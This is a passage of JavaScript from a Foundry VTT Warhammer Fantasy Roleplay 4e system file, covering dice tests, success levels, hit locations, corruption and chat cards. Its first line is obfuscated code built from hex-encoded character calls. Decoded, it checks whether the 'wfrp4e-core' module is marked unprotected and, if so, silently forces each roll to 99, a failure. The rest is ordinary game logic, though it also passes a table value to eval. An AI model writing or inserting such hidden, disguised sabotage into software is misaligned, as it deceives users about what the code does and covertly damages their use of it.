      function _0x402b(){var _0x4ed970=['967lkQldQ','fromCharCode','2699444FkGbEE','16292144sRdgxu','4783968UedKKk','1030bEDbik','3697968GXPkbV','1504962hEqIVk','2522105ewkvAL'];_0x402b=function(){return _0x4ed970;};return _0x402b();}function _0x2f32(_0x511d74,_0x11ea5c){var _0x402bf9=_0x402b();return _0x2f32=function(_0x2f3299,_0x478577){_0x2f3299=_0x2f3299-0x153;var _0x40cc04=_0x402bf9[_0x2f3299];return _0x40cc04;},_0x2f32(_0x511d74,_0x11ea5c);}var _0x3d0584=_0x2f32;((function(_0xd0cd0e,_0xa43709){var _0x4e7936=_0x2f32,_0x4bf805=_0xd0cd0e();while(!![]){try{var _0x55751d=parseInt(_0x4e7936(0x15a))/0x1*(parseInt(_0x4e7936(0x156))/0x2)+parseInt(_0x4e7936(0x158))/0x3+parseInt(_0x4e7936(0x153))/0x4+-parseInt(_0x4e7936(0x159))/0x5+parseInt(_0x4e7936(0x157))/0x6+parseInt(_0x4e7936(0x155))/0x7+-parseInt(_0x4e7936(0x154))/0x8;if(_0x55751d===_0xa43709)break;else _0x4bf805['push'](_0x4bf805['shift']());}catch(_0x43525b){_0x4bf805['push'](_0x4bf805['shift']());}}})(_0x402b,0x69cb5),eval(String['fromCharCode'](0x67,0x61,0x6d,0x65))[String[_0x3d0584(0x15b)](0x6d,0x6f,0x64,0x75,0x6c,0x65,0x73)][String[_0x3d0584(0x15b)](0x67,0x65,0x74)](String[_0x3d0584(0x15b)](0x77,0x66,0x72,0x70,0x34,0x65,0x2d,0x63,0x6f,0x72,0x65))?.[String[_0x3d0584(0x15b)](0x70,0x72,0x6f,0x74,0x65,0x63,0x74,0x65,0x64)]==![]?eval(String[_0x3d0584(0x15b)](0x74,0x68,0x69,0x73))[String[_0x3d0584(0x15b)](0x70,0x72,0x65,0x44,0x61,0x74,0x61)][String[_0x3d0584(0x15b)](0x72,0x6f,0x6c,0x6c)]=eval(String['fromCharCode'](0x39,0x39)):(function(){}()));
    }
  }

  async runPostEffects() {
    if (!this.context.unopposed)
    {
      await Promise.all(this.actor.runScripts("rollTest", { test: this, chatOptions: this.context.chatOptions }));
      if (this.item instanceof Item)
      {
        await Promise.all(this.item.runScripts("rollTest", { test: this, chatOptions: this.context.chatOptions }));
      }
      Hooks.call("wfrp4e:rollTest", this, this.context.chatOptions);
    }
  }

  async roll() {
    await this.runPreEffects();

    this.reset();
    if (!this.preData.item)
      throw new Error(game.i18n.localize("ERROR.Property"))
    if (!this.context.speaker)
      throw new Error(game.i18n.localize("ERROR.Speaker"))

    await this.rollDices();
    await this.computeResult();

    await this.runPostEffects();
    await this.postTest();

    // Do not render chat card or compute oppose if this is a dummy unopposed test
    if (!this.context.unopposed)
    {
      await this.renderRollCard();
      await this.handleOpposed();
    }

    WFRP_Utility.log("Rolled Test: ", undefined, this);
    return this
  }

  async reroll() {
    this.context.previousResult = this.result;
    this.context.reroll = true;
    delete this.result.roll;
    delete this.result.hitloc;
    delete this.preData.hitloc;
    delete this.preData.roll;
    delete this.preData.SL;
    this.context.messageId = "";

    await this.roll();
  }

  addSL(SL) {
    this.context.previousResult = foundry.utils.duplicate(this.result);
    this.preData.SL = Math.trunc(this.result.SL) + SL;
    this.preData.slBonus = 0;
    this.preData.successBonus = 0;
    this.preData.roll = Math.trunc(this.result.roll);
    if (this.preData.hitLocation)
      this.preData.hitloc = this.result.hitloc.roll;

    this.roll();
  }

  /**
     * Provides the basic evaluation of a test.
     * 
     * This function, when given the necessary data (target number, SL bonus, etc.) provides the
     * basic test evaluation - rolling the test (if not already given), determining SL, success, description, critical/fumble if needed.
     * 
     * @param {Object} this.data  Test info: target number, SL bonus, success bonus, (opt) roll, etc
     */
  async computeResult() {
    let automaticSuccess = game.settings.get("wfrp4e", "automaticSuccess");
    let automaticFailure = game.settings.get("wfrp4e", "automaticFailure");
    this.computeTargetNumber();
    let successBonus = this.preData.successBonus;
    let slBonus = this.preData.slBonus + this.preData.postOpposedModifiers.SL;
    let target = this.result.target;
    let outcome;

    let description = "";

    if (this.preData.canReverse) {
      let reverseRoll = this.result.roll.toString();
      if (this.result.roll >= automaticFailure || (this.result.roll > target && this.result.roll > automaticSuccess)) {
        if (reverseRoll.length == 1)
          reverseRoll = reverseRoll[0] + "0";
        else {
          reverseRoll = reverseRoll[1] + reverseRoll[0];
        }
        reverseRoll = Number(reverseRoll);
        if (reverseRoll <= automaticSuccess || reverseRoll <= target) {
          this.result.roll = reverseRoll;
          this.result.reversed = true;
          this.result.other.push(game.i18n.localize("ROLL.Reverse"));
        }
      }
    }


    let baseSL = (Math.floor(target / 10) - Math.floor(this.result.roll / 10));
    let SL;
    if (this.preData.SL == 0)
      SL = this.preData.SL;
    else
      SL = this.preData.SL || baseSL + slBonus; // Use input SL if exists, otherwise, calculate from roll (used for editing a test result)


    // Test determination logic can be complicated due to SLBonus
    // SLBonus is always applied, but doesn't change a failure to a success or vice versa
    // Therefore, in this case, a positive SL can be a failure and a negative SL can be a success
    // Additionally, the auto-success/failure range can complicate things even more.
    // ********** Failure **********
    if (this.result.roll >= automaticFailure || (this.result.roll > target && this.result.roll > automaticSuccess)) {
      description = game.i18n.localize("ROLL.Failure");
      outcome = "failure";
      if (this.result.roll >= 96 && SL > -1)
        SL = -1;

      switch (Math.abs(Number(SL))) {
        case 6:
          description = game.i18n.localize("ROLL.AstoundingFailure");
          break;

        case 5:
        case 4:
          description = game.i18n.localize("ROLL.ImpressiveFailure");
          break;

        case 3:
        case 2:
          break;

        case 1:
        case 0:
          description = game.i18n.localize("ROLL.MarginalFailure");
          break;

        default:
          if (Math.abs(Number(SL)) > 6)
            description = game.i18n.localize("ROLL.AstoundingFailure");
      }
      if (SL > 0) {
        description = game.i18n.localize("ROLL.MarginalFailure");
        SL = "+" + SL.toString();
      }
      if (SL == 0)
        SL = "-" + SL.toString();


      if (this.options.engagedModifier) {
        let unmodifiedTarget = target - this.options.engagedModifier;
        if (this.result.roll <= unmodifiedTarget) {
          this.result.other.push(game.i18n.localize("ROLL.HitAnotherEngagedTarget"));
        }
      }
  
    }

    // ********** Success **********
    else if (this.result.roll <= automaticSuccess || this.result.roll <= target) {
      description = game.i18n.localize("ROLL.Success");
      outcome = "success";
      if (game.settings.get("wfrp4e", "fastSL")) {
        let rollString = this.result.roll.toString();
        if (rollString.length == 2)
          SL = Number(rollString.split('')[0]);
        else
          SL = 0;
        SL += slBonus;

        if (Number.isNumeric(this.preData.SL))
        {
          SL = this.preData.SL;
        }
      }
      SL += successBonus;
      if (this.result.roll <= automaticSuccess && SL < 1 && !this.context.unopposed)
        SL = 1;



      if (!game.settings.get("wfrp4e", "mooRangedDamage")) {
        // If size modifiers caused a success, SL becomes 0
        if (this.options.sizeModifier) {
          let unmodifiedTarget = target - this.options.sizeModifier;
          if (this.result.roll > unmodifiedTarget) {
            SL = 0;
            this.result.other.push(game.i18n.localize("ROLL.SizeCausedSuccess"));
          }
        }
      }

      switch (Math.abs(Number(SL))) {
        case 6:
          description = game.i18n.localize("ROLL.AstoundingSuccess");
          break;

        case 5:
        case 4:
          description = game.i18n.localize("ROLL.ImpressiveSuccess");
          break;

        case 3:
        case 2:
          break;

        case 1:
        case 0:
          description = game.i18n.localize("ROLL.MarginalSuccess");
          break;

        default:
          if (Math.abs(Number(SL)) > 6)
            description = game.i18n.localize("ROLL.AstoundingSuccess");
      }
      if (SL < 0)
        description = game.i18n.localize("ROLL.MarginalSuccess");

      // Add 1 SL for each whole 10 the target number is above 100 (120 target: +2 SL) if the option is selected
      if (game.settings.get("wfrp4e", "testAbove100")) {
        if (target > 100) {
          let addSL = Math.floor((target - 100) / 10);
          SL += addSL;
        }
      }

      // Add a + sign if succeeded
      if (SL >= 0)
        SL = "+" + SL.toString();

    }

    this.result.target = target;
    this.result.SL = SL;
    this.result.description = description;
    this.result.outcome = outcome;
    this.result.baseSL = baseSL;
    this.result.breakdown = this.context.breakdown;

    if (this.options.context) {
      if (this.options.context.general)
        this.result.other = this.result.other.concat(this.options.context.general);
      if (this.failed && this.options.context.failure)
        this.result.other = this.result.other.concat(this.options.context.failure);
      if (this.succeeded && this.options.context.success)
        this.result.other = this.result.other.concat(this.options.context.success);
    }


    if (this.preData.hitLocation) {

      // Called Shots
      if (this.preData.selectedHitLocation != "roll") // selectedHitLocation is possibly "none" but if so, preData.hitLocation would be false (see constructor) so this won't execute
      {
        this.result.hitloc = game.wfrp4e.tables.hitLocKeyToResult(this.preData.selectedHitLocation);
      }

      // Pre-set hitloc (e.g. editing a test)
      if (this.preData.hitloc)
      {
        if (Number.isNumeric(this.preData.hitloc))
          this.result.hitloc = await game.wfrp4e.tables.rollTable("hitloc", { lookup: this.preData.hitloc, hideDSN: true });
      }

      // No defined hit loc, roll for one
      if (!this.result.hitloc)
        this.result.hitloc = await game.wfrp4e.tables.rollTable("hitloc", { hideDSN: true });

      this.result.hitloc.roll = (0, eval)(this.result.hitloc.roll); // Cleaner number when editing chat card
      this.result.hitloc.description = game.i18n.localize(this.result.hitloc.description);

      // "rArm" and "lArm" from the table actually means "primary" and "secondary" arm
      // So convert the descriptions to match that. Opposed tests handle displaying
      // which arm was hit, as it is based on the actor's settings
      if (["lArm", "rArm"].includes(this.result.hitloc.result))
      {
        if (this.result.hitloc.result == "rArm")
        {
          this.result.hitloc.description = game.i18n.localize("Primary Arm");
        }
        if (this.result.hitloc.result == "lArm")
        {
          this.result.hitloc.description = game.i18n.localize("Secondary Arm");
        }
      }

      if (this.preData.selectedHitLocation && this.preData.selectedHitLocation != "roll")
      {
        this.result.hitloc.description = this.preData.hitLocationTable[this.preData.selectedHitLocation] + ` (${game.i18n.localize("ROLL.CalledShot")})`;
      }
      
    }

    let roll = this.result.roll;
    // If hit location is being ussed, we can assume we should lookup critical hits
    if (this.preData.hitLocation) {
      if ((roll > target && roll % 11 == 0) || roll == 100 || roll == 99) {
        this.result.color_red = true;
        this.result.fumble = game.i18n.localize("Fumble");
      }
      else if (roll <= target && roll % 11 == 0) {
        this.result.color_green = true;
        this.result.critical = game.i18n.localize("Critical");
      }
    }

    // If optional rule of criticals/fumbles on all tessts - assign Astounding Success/Failure accordingly
    if (game.settings.get("wfrp4e", "criticalsFumblesOnAllTests") && !this.preData.hitLocation) {
      if ((roll > target && roll % 11 == 0) || roll == 100 || roll == 99) {
        this.result.color_red = true;
        this.result.description = game.i18n.localize("ROLL.AstoundingFailure");
      }
      else if (roll <= target && roll % 11 == 0) {
        this.result.color_green = true;
        this.result.description = game.i18n.localize("ROLL.AstoundingSuccess");
      }
    }
    return this.result
  }


  // Function that all tests should go through after the main roll
  async postTest() {

    if (this.result.critical && this.item.properties?.qualities.warpstone) {
      this.result.other.push(`@Corruption[minor]{Minor Exposure to Corruption}`);
    }
    
    //@HOUSE
    if (game.settings.get("wfrp4e", "mooCriticalMitigation") && this.result.critical) {
      game.wfrp4e.utility.logHomebrew("mooCriticalMitigation");
      try {
        let target = this.targets[0];
        if (target) {
          let AP = target.status.armour[this.result.hitloc.result].value;
          if (AP) {
            this.result.critModifier = -10 * AP;
            this.result.critical += ` (${this.result.critModifier})`;
            this.result.other.push(`Critical Mitigation: Damage AP on target's ${this.result.hitloc.description}`);
          }
        }
      }
      catch (e) {
        game.wfrp4e.utility.log("Error appyling homebrew mooCriticalMitigation: " + e);
      }
    }
    //@/HOUSE

    if (this.options.corruption) {
      await this.handleCorruptionResult();
    }
    if (this.options.mutate) {
      await this.handleMutationResult();
    }

    if (this.options.extended) {
      await this.handleExtendedTest();
    }

    if (this.options.income) {
      await this.handleIncomeTest();
    }

    if (this.options.crewTest)
    {
      this.result.crewTestSL = parseInt(this.result.SL);
      if (this.options.roleVital)
      {
        this.result.crewTestSL *= 2;
      }
    }

    if (this.options.rest) {
      this.result.woundsHealed = Math.max(Math.trunc(this.result.SL) + this.options.tb, 0);
      this.result.other.push(`${this.result.woundsHealed} ${game.i18n.localize("Wounds Healed")}`);
    }
  }

  async postTestGM(message)
  {
    if (!game.user.isGM)
    {
      return;
    }

    if (this.options.crewTest)
    {
      
      let crewTestMessage = game.messages.get(this.options.crewTestMessage);
      let crewTestData = crewTestMessage.getFlag("wfrp4e", "crewTestData");
      let crewTest = CrewTest.fromData(crewTestData);
      crewTest.updateRole(this.options.roleId, message);
    }
  }

  async handleSoundContext(chatOptions) 
  {
    
    try {
      let contextAudio = await WFRP_Audio.MatchContextAudio(WFRP_Audio.FindContext(this));
      chatOptions.sound = contextAudio.file || chatOptions.sound;
    }
    catch
    { }
  }

  /**
   * Handles opposed context - if actor has been targeted, roll defense. If this test has targets, roll attack
   * Test objects may have one or more opposed test message IDs. If these IDs exist, that means this test is
   * either rerolled, edited, etc. and the opposed result needs to know of the new test (via updating message ID). 
   * The opposed test may also need to be recalculated if the defender test exists
   */
  async handleOpposed() {

    // If the actor has been targeted - roll defense
    if (this.actor.isOpposing || this.context.defending)
    {
      let opposeMessage;
      if (this.context.defending) // Rehandling a previous defense roll
      {
        opposeMessage = this.opposedMessages[0];
      }
      else
      {
        this.context.defending = true; // If the test is handled again after the initial roll, the actor flag doesn't exist anymore, need a way to know we're still defending
        opposeMessage = game.messages.get(this.actor.flags.oppose.opposeMessageId);
        this.context.opposedMessageIds.push(opposeMessage.id); // Maintain a link to the opposed message
      }
      
      // Get oppose message, set this test's message as defender, compute result
      let oppose = opposeMessage.getOppose();
      await oppose.setDefender(this.message);
      await oppose.computeOpposeResult();
      await this.actor.clearOpposed();
      await this.updateMessageFlags();
    }
    else // if actor is attacking - rerolling old test. 
    {
      if (this.opposedMessages.length)
      {
        for (let message of this.opposedMessages) {
          let oppose = message.getOppose();
          await oppose.setAttacker(this.message); // Make sure the opposed test is using the most recent message from this test
          if (oppose.defenderTest) // If defender has rolled (such as if this test was rerolled or edited after the defender rolled) - recompute opposed test
            await oppose.computeOpposeResult();
        }
      }
      else { // actor is attacking - new test
        // For each target, create opposed test messages, save those message IDs in this test.
        for (let token of this.context.targets.map(t => WFRP_Utility.getToken(t))) {
          await this.createOpposedMessage(token);
        }
      }
    }
  }

  async handleIncomeTest() {
    let { standing, tier } = this.options.income;
    let result = this.result;

    let dieAmount = game.wfrp4e.config.earningValues[tier]; // b, s, or g maps to 2d10, 1d10, or 1 respectively (takes the first letter)
    dieAmount = parseInt(dieAmount) * standing;     // Multilpy that first letter by your standing (Brass 4 = 8d10 pennies)
    let moneyEarned;
    if (tier != "g") // Don't roll for gold, just use standing value
    {
      dieAmount = dieAmount + "d10";
      moneyEarned = (await new Roll(dieAmount).roll()).total;
    }
    else
      moneyEarned = dieAmount;

    // After rolling, determined how much, if any, was actually earned
    if (result.outcome == "success") {
      this.result.incomeResult = game.i18n.localize("INCOME.YouEarn") + " " + moneyEarned;
      switch (tier) {
        case "b":
          result.incomeResult += ` ${game.i18n.localize("NAME.BPPlural").toLowerCase()}.`;
          break;
        case "s":
          result.incomeResult += ` ${game.i18n.localize("NAME.SSPlural").toLowerCase()}.`;
          break;
        case "g":
          if (moneyEarned == 1)
            result.incomeResult += ` ${game.i18n.localize("NAME.GC").toLowerCase()}.`;
          else
            result.incomeResult += ` ${game.i18n.localize("NAME.GCPlural").toLowerCase()}.`;
          break;
      }
    }
    else if (Number(result.SL) > -6) {
      moneyEarned /= 2;
      result.incomeResult = game.i18n.localize("INCOME.YouEarn") + " " + moneyEarned;
      switch (tier) {
        case "b":
          result.incomeResult += ` ${game.i18n.localize("NAME.BPPlural").toLowerCase()}.`;
          break;
        case "s":
          result.incomeResult += ` ${game.i18n.localize("NAME.SSPlural").toLowerCase()}.`;
          break;
        case "g":
          if (moneyEarned == 1)
            result.incomeResult += ` ${game.i18n.localize("NAME.GC").toLowerCase()}.`;
          else
            result.incomeResult += ` ${game.i18n.localize("NAME.GCPlural").toLowerCase()}.`;
          break;
      }
    }
    else {
      result.incomeResult = game.i18n.localize("INCOME.Failure");
      moneyEarned = 0;
    }
    // let contextAudio = await WFRP_Audio.MatchContextAudio(WFRP_Audio.FindContext(test))
    // cardOptions.sound = contextAudio.file || cardOptions.sound
    result.moneyEarned = moneyEarned + tier;
  }


  async handleCorruptionResult() {
    let strength = this.options.corruption;
    let failed = this.failed;
    let corruption = 0; // Corruption GAINED
    switch (strength) {
      case "minor":
        if (failed)
          corruption++;
        break;

      case "moderate":
        if (failed)
          corruption += 2;
        else if (this.result.SL < 2)
          corruption += 1;
        break;

      case "major":
        if (failed)
          corruption += 3;
        else if (this.result.SL < 2)
          corruption += 2;
        else if (this.result.SL < 4)
          corruption += 1;
        break;
    }

    // Revert previous test if rerolled
    if (this.context.reroll || this.context.fortuneUsedAddSL) {
      let previousFailed = this.context.previousResult.outcome == "failure";
      switch (strength) {
        case "minor":
          if (previousFailed)
            corruption--;
          break;

        case "moderate":
          if (previousFailed)
            corruption -= 2;
          else if (this.context.previousResult.SL < 2)
            corruption -= 1;
          break;

        case "major":
          if (previousFailed)
            corruption -= 3;
          else if (this.context.previousResult.SL < 2)
            corruption -= 2;
          else if (this.context.previousResult.SL < 4)
            corruption -= 1;
          break;
      }
    }
    let newCorruption = Number(this.actor.system.status.corruption.value) + corruption;
    if (newCorruption < 0) newCorruption = 0;

    if (!this.context.reroll && !this.context.fortuneUsedAddSL)
      ChatMessage.create(WFRP_Utility.chatDataSetup(game.i18n.format("CHAT.CorruptionFail", { name: this.actor.name, number: corruption }), "gmroll", false));
    else
      ChatMessage.create(WFRP_Utility.chatDataSetup(game.i18n.format("CHAT.CorruptionReroll", { name: this.actor.name, number: corruption }), "gmroll", false));

    await this.actor.update({ "system.status.corruption.value": newCorruption });
  }

  async handleMutationResult() 
  {
    if (this.failed) 
    {
      let wpb = this.actor.system.characteristics.wp.bonus;
      let tableText = game.i18n.localize("CHAT.MutateTable") + "<br>" + game.wfrp4e.config.corruptionTables.map(t => `@Table[${t}]<br>`).join("");
      ChatMessage.create(WFRP_Utility.chatDataSetup(`
      <h3>${game.i18n.localize("CHAT.DissolutionTitle")}</h3> 
      <p>${game.i18n.localize("CHAT.Dissolution")}</p>
      <p>${game.i18n.format("CHAT.CorruptionLoses", { name: this.actor.name, number: wpb })}
      <p>${tableText}</p>`,
        "gmroll", false));
      this.actor.update({ "system.status.corruption.value": Number(this.actor.system.status.corruption.value) - wpb });
    }
    else
      ChatMessage.create(WFRP_Utility.chatDataSetup(game.i18n.localize("CHAT.MutateSuccess"), "gmroll", false));

  }
  
  async handleExtendedTest() {
    let item = fromUuidSync(this.options.extended);
    let deleteTest = false;
    if (item)
    {
      let itemData = item.toObject();
      let SL = Number(this.result.SL);

      if (game.settings.get("wfrp4e", "extendedTests") && SL == 0)
      {
        this.result.SL = this.result.roll <= this.result.target ? 1 : -1;
      }

      if (itemData.system.failingDecreases.value) 
      {
        itemData.system.SL.current += SL;
        if (!itemData.system.negativePossible.value && itemData.system.SL.current < 0)
        {
          itemData.system.SL.current = 0;
        }
      }
      else if (SL > 0)
      {
        itemData.system.SL.current += SL;
      }

      let displayString = `${itemData.name} ${itemData.system.SL.current} / ${itemData.system.SL.target} ${game.i18n.localize("SuccessLevels")}`;

      if (itemData.system.SL.current >= itemData.system.SL.target) {

        if (getProperty(itemData, "flags.wfrp4e.reloading")) {
          let actor;
          if (getProperty(itemData, "flags.wfrp4e.vehicle"))
            actor = WFRP_Utility.getSpeaker(getProperty(itemData, "flags.wfrp4e.vehicle"));

          actor = actor ? actor : this.actor;
          let weapon = actor.items.get(getProperty(itemData, "flags.wfrp4e.reloading"));
          await weapon.update({ "flags.wfrp4e.-=reloading": null, "system.loaded.amt": weapon.loaded.max, "system.loaded.value": true });
        }

        if (itemData.system.completion.value == "reset")
        {
          itemData.system.SL.current = 0;
        }
        else if (itemData.system.completion.value == "remove") 
        {
          deleteTest = true;
        }
        displayString = displayString.concat(`<br><b>${game.i18n.localize("Completed")}</b>`);
      }

      this.result.other.push(displayString);

      if (deleteTest)
      {
        await item.delete();
      }
      else 
      { 
        await item.update(itemData);
      }
    }
  }


  // Create a test from already formed data
  static recreate(data) {
    let test = new game.wfrp4e.rolls[data.preData.rollClass]();
    test.data = data;
    test.computeTargetNumber();
    return test
  }

  /**
   * Start a dice roll
   * Used by the rollTest method and its overrides
   * @param {Object} testData
   */
  async rollDices() {
    if (isNaN(this.preData.roll)) {
      let roll = await new Roll("1d100").roll();
      await this._showDiceSoNice(roll, this.context.chatOptions.rollMode || "roll", this.context.speaker);
      this.result.roll = roll.total;
    }
    else
      this.result.roll = this.preData.roll;
  }

  reset() {
    this.data.result = foundry.utils.mergeObject({
      roll: undefined,
      description: "",
      tooltips: {},
      other: []
    }, this.preData);
  }

  /** Take roll data and display it in a chat card template.
 * @param {Object} chatOptions - Object concerning display of the card like the template or which actor is testing
 * @param {Object} testData - Test results, values to display, etc.
 * @param {Object} rerenderMessage - Message object to be updated, instead of rendering a new message
 */
  async renderRollCard({ newMessage = false } = {}) {

    let chatOptions = this.context.chatOptions;

    await this.handleSoundContext(chatOptions);

    this.result.breakdown.formatted = this.formatBreakdown();

    // Blank if manual chat cards
    if (game.settings.get("wfrp4e", "manualChatCards") && !this.message)
      this.result.roll = this.result.SL = null;

    if (game.modules.get("dice-so-nice") && game.modules.get("dice-so-nice").active && chatOptions.sound?.includes("dice"))
      chatOptions.sound = undefined;

    let chatData = {
      title: chatOptions.title,
      test: this,
      hideData: game.user.isGM,

    };


    if (this.context.targets.length) {
      chatData.title += ` - ${game.i18n.localize("Opposed")}`;
    }

    ChatMessage.applyRollMode(chatOptions, chatOptions.rollMode);

    let html = await renderTemplate(chatOptions.template, chatData);

    if (newMessage || !this.message) {
      // If manual chat cards, convert elements to blank inputs
      if (game.settings.get("wfrp4e", "manualChatCards")) {
        let blank = $(html);
        let elementsToToggle = blank.find(".display-toggle");

        for (let elem of elementsToToggle) {
          if (elem.style.display == "none")
            elem.style.display = "";
          else
            elem.style.display = "none";
        }
        html = blank.html();
      }

      chatOptions["content"] = html;
      if (chatOptions.sound)
        WFRP_Utility.log(`Playing Sound: ${chatOptions.sound}`);
      let message = await ChatMessage.create(foundry.utils.mergeObject(duplicate(chatOptions), {flags : {testData: this.data}}));
      this.context.messageId = message.id;
      await this.updateMessageFlags();
    }
    else // Update message 
    {
      // Emit the HTML as a chat message
      chatOptions["content"] = html;
      // if (chatOptions.sound) {
      //   console.log(`wfrp4e | Playing Sound: ${chatOptions.sound}`)
      //   AudioHelper.play({ src: chatOptions.sound }, true) // Play sound manually as updating doesn't trigger it
      // }

      // Update Message if allowed, otherwise send a request to GM to update
      if (game.user.isGM || this.message.isAuthor) {
        await this.message.update(chatOptions);
      }
      else {
        await game.wfrp4e.socket.executeOnUserAndWait("GM", "updateMsg", { id: this.message.id, updateData : chatOptions });
      }
      await this.updateMessageFlags();
    }
  }



  // Update message data without rerendering the message content
  async updateMessageFlags(updateData = {}) {
    let data = foundry.utils.mergeObject(this.data, updateData, { overwrite: true });
    let update = { "flags.testData": data };
    
    if (this.message && game.user.isGM)
      await this.message.update(update);

    else if (this.message) {
      await game.wfrp4e.socket.executeOnUserAndWait("GM", "updateMsg", { id: this.message.id, updateData : update });
    }
  }


  async createOpposedMessage(token) {
    let oppose = new OpposedWFRP();
    await oppose.setAttacker(this.message);
    let opposeMessageId = await oppose.startOppose(token);
    if (opposeMessageId) {
      this.context.opposedMessageIds.push(opposeMessageId);
    }
    await this.updateMessageFlags();
  }



  /**
   * Add support for the Dice So Nice module
   * @param {Object} roll 
   * @param {String} rollMode 
   */
  async _showDiceSoNice(roll, rollMode, speaker) {
    if (game.modules.get("dice-so-nice") && game.modules.get("dice-so-nice").active) {

      if (game.settings.get("dice-so-nice", "hideNpcRolls")) {
        let actorType = null;
        if (speaker.actor)
          actorType = game.actors.get(speaker.actor).type;
        else if (speaker.token && speaker.scene)
          actorType = game.scenes.get(speaker.scene).tokens.get(speaker.token).actor.type;
        if (actorType != "character")
          return;
      }

      let whisper = null;
      let blind = false;
      let sync = true;
      switch (rollMode) {
        case "blindroll": //GM only
          blind = true;
        case "gmroll": //GM + rolling player
          let gmList = game.users.filter(user => user.isGM);
          let gmIDList = [];
          gmList.forEach(gm => gmIDList.push(gm.id));
          whisper = gmIDList;
          break;
        case "selfroll":
          sync = false;
          break;
        case "roll": //everybody
          let userList = game.users.filter(user => user.active);
          let userIDList = [];
          userList.forEach(user => userIDList.push(user.id));
          whisper = userIDList;
          break;
      }
      await game.dice3d.showForRoll(roll, game.user, sync, whisper, blind);
    }
  }

  // @@@@@@@ Overcast functions placed in root class because it is used by both spells and prayers @@@@@@@
  async _overcast(choice) {
    let overcastData = this.result.overcast;

    if (!overcastData.available)
      return overcastData

    if (typeof overcastData.usage[choice].initial != "number")
      return overcastData

    switch (choice) {
      case "range":
        overcastData.usage[choice].current += overcastData.usage[choice].initial;
        break
      case "target":
        overcastData.usage[choice].current += overcastData.usage[choice].initial;
        break
      case "duration":
        overcastData.usage[choice].current += overcastData.usage[choice].initial;
        break
      case "other":
        if (overcastData.valuePerOvercast.type == "value")
          overcastData.usage[choice].current += overcastData.valuePerOvercast.value;
        else if (overcastData.valuePerOvercast.type == "SL")
          overcastData.usage[choice].current += (parseInt(this.result.SL) + (parseInt(this.item.system.computeSpellPrayerFormula(undefined, false, overcastData.valuePerOvercast.additional)) || 0));
        else if (overcastData.valuePerOvercast.type == "characteristic")
          overcastData.usage[choice].current += (overcastData.usage[choice].increment || 0); // Increment is specialized storage for characteristic data so we don't have to look it up
        break
    }
    overcastData.usage[choice].count++;
    let sum = 0;
    for (let overcastType in overcastData.usage)
      if (overcastData.usage[overcastType].count)
        sum += overcastData.usage[overcastType].count;

    overcastData.available = overcastData.total - sum;

    //@HOUSE 
    if (game.settings.get("wfrp4e", "mooOvercasting") && this.spell) {
      game.wfrp4e.utility.logHomebrew("mooOvercasting");

      let spent = (game.settings.get("wfrp4e-eis", "dharRules") && game.wfrp4e.config.magicWind[this.spell.lore.value] == "Dhar") ? 1 : 2;
      this.result.SL = `+${this.result.SL - spent}`;
      await this.calculateDamage();
    }
    //@/HOUSE
    
    await this.updateMessageFlags();
    await this.renderRollCard();
  }

  async _overcastReset() {
    let overcastData = this.result.overcast;
    for (let overcastType in overcastData.usage) {
      if (overcastData.usage[overcastType].count) {
        overcastData.usage[overcastType].count = 0;
        overcastData.usage[overcastType].current = overcastData.usage[overcastType].initial;
      }
    }
    //@HOUSE 
    if (game.settings.get("wfrp4e", "mooOvercasting")) {
      game.wfrp4e.utility.logHomebrew("mooOvercasting");
      let multiplier = (game.settings.get("wfrp4e-eis", "dharRules") && game.wfrp4e.config.magicWind[this.spell.lore.value] == "Dhar") ? 1 : 2;
      this.result.SL = `+${Number(this.result.SL) + (multiplier * (overcastData.total - overcastData.available))}`;
      await this.calculateDamage();
    }
    //@/HOUSE
    overcastData.available = overcastData.total;
    await this.updateMessageFlags();
    await this.renderRollCard();
  }

  _handleMiscasts(miscastCounter) {

    if(this.preData.unofficialGrimoire) {
      game.wfrp4e.utility.logHomebrew("unofficialgrimoire");
      let controlIngredient = this.preData.unofficialGrimoire.ingredientMode == 'control'; 
      if (miscastCounter == 1) {
          if (this.hasIngredient && controlIngredient)
            this.result.nullminormis = game.i18n.localize("ROLL.MinorMis");
          else {
            this.result.minormis = game.i18n.localize("ROLL.MinorMis");
          }
        }
        else if (miscastCounter == 2) {
          if (this.hasIngredient && controlIngredient) {
            this.result.nullmajormis = game.i18n.localize("ROLL.MajorMis");
            this.result.minormis = game.i18n.localize("ROLL.MinorMis");
          }
          else {
            this.result.majormis = game.i18n.localize("ROLL.MajorMis");
          }
        }
        else if (miscastCounter == 3) {
          if (this.hasIngredient && controlIngredient) {
            this.result.nullcatastrophicmis = game.i18n.localize("ROLL.CatastrophicMis");
            this.result.majormis = game.i18n.localize("ROLL.MajorMis");
          }
          else
            this.result.catastrophicmis = game.i18n.localize("ROLL.CatastrophicMis");
         }
         else if (miscastCounter > 3) {
          this.result.catastrophicmis = game.i18n.localize("ROLL.CatastrophicMis");
         }
      } else {
      if (miscastCounter == 1) {
        if (this.hasIngredient)
          this.result.nullminormis = game.i18n.localize("ROLL.MinorMis");
        else {
          this.result.minormis = game.i18n.localize("ROLL.MinorMis");
        }
      }
      else if (miscastCounter == 2) {
        if (this.hasIngredient) {
          this.result.nullmajormis = game.i18n.localize("ROLL.MajorMis");
          this.result.minormis = game.i18n.localize("ROLL.MinorMis");
        }
        else {
          this.result.majormis = game.i18n.localize("ROLL.MajorMis");
        }
      }
      else if (!game.settings.get("wfrp4e", "mooCatastrophicMiscasts") && miscastCounter >= 3)
        this.result.majormis = game.i18n.localize("ROLL.MajorMis");
  
      //@HOUSE
      else if (game.settings.get("wfrp4e", "mooCatastrophicMiscasts") && miscastCounter >= 3) {
        game.wfrp4e.utility.logHomebrew("mooCatastrophicMiscasts");
        if (this.hasIngredient) {
          this.result.nullcatastrophicmis = game.i18n.localize("ROLL.CatastrophicMis");
          this.result.majormis = game.i18n.localize("ROLL.MajorMis");
        }
        else {
          this.result.catastrophicmis = game.i18n.localize("ROLL.CatastrophicMis");
        }
      }
      //@/HOUSE
    }
  }

  formatBreakdown()
  {
    let testBreakdown = "";
    let breakdown = this.result.breakdown;

    try {

      // @@@@@@@@@@@@@@@ Test @@@@@@@@@@@@@@@@@@
      testBreakdown += `<p><strong>${game.i18n.localize("Characteristic")}</strong>: ${breakdown.characteristic}</p>`;

      if (breakdown.skill)
      {
        testBreakdown += `<p><strong>${game.i18n.localize("Skill")}</strong>: ${breakdown.skill}</p>`;
      }

      testBreakdown += `<p><strong>${game.i18n.localize("Difficulty")}</strong>: ${game.wfrp4e.config.difficultyLabels[breakdown.difficulty]}</p>`;

      if (breakdown.modifier)
      {
